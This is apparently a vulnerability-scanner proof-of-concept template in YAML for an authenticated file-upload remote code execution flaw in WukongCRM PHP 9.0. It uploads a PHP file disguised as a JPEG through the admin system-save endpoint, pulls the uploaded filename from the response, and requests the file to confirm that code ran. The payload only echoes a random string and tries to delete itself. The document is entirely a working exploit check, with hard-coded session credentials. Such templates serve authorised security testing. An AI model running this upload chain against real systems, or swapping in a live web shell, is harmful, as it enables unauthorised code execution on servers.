name: poc-yaml-wukongcrm-php9-upload-rce
binding: 48e0d4ef-740c-4d7a-9d10-10fa5490ba6f
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    links:
        - https://github.com/72wukong/72crm-9.0-PHP/issues/35
    vulnerability:
        id: CT-517506
        level: high
    description: |
        wukongcrm php 9.0 post-auth upload rce
    check_action: |
        need login, set `authKey` and `sessionId`
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    rboundary: randomLowercase(8)
    authKey: b"ac4f091909a555e773f874a781800ab0"
    sessionId: b"d3o7e9esol6r3roi9hksppu5b2"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php/admin/system/save
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
                authKey: '{{authKey}}'
                sessionId: '{{sessionId}}'
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"name\"\r\n\nwukongCRM\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: image/jpeg\r\n\n<?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
        expression: response.status == 200 && response.body.bcontains(bytes('"code":200'))
    r1:
        request:
            cache: true
            method: POST
            path: /index.php/admin/system/index
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes('"code":200')) && response.body_string.contains("logo") && response.body_string.contains(".php")
        output:
            search: '''"logo":"(?P<filename>.+?).php"''.bsubmatch(response.body)'
            uploadfilename: replaceAll(search["filename"], "\\", "")
    r2:
        request:
            cache: true
            method: GET
            path: ^{{uploadfilename}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(r2))
expression: r0() && r1() && r2()
